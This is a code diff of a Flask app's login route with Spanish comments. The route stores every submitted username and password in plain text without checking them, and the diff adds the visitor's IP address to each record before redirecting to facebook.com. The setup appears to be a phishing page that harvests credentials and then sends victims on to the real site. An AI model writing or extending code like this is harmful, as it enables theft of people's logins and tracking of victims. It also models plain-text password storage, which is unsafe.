@@ -27,16 +27,23 @@ def login():
     usuario = request.form['usuario']
     contrasena = request.form['contrasena']
 
-    # Registrar acceso normal
+    # Obtener IP real (Railway usa X-Forwarded-For)
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    # Registrar acceso con IP
     cur = mysql.connection.cursor()
-    cur.execute("INSERT INTO accesos (usuario, contrasena) VALUES (%s, %s)", (usuario, contrasena))
+    cur.execute(
+        "INSERT INTO accesos (usuario, contrasena, ip) VALUES (%s, %s, %s)",
+        (usuario, contrasena, ip)
+    )
     mysql.connection.commit()
     cur.close()
 
     session['usuario'] = usuario
 
-    # ⭐ REDIRIGIR A UNA PÁGINA EXTERNA DESPUÉS DE INICIAR SESIÓN
-    return redirect("https://www.facebook.com/")   # ← CAMBIA ESTA URL POR LA QUE QUIERAS
+    return redirect("https://www.facebook.com/") # ← CAMBIA ESTA URL POR LA QUE QUIERAS
+
+     #REDIRIGIR A UNA PÁGINA EXTERNA DESPUÉS DE INICIAR SESIÓN
 
 
 @app.route('/registro')
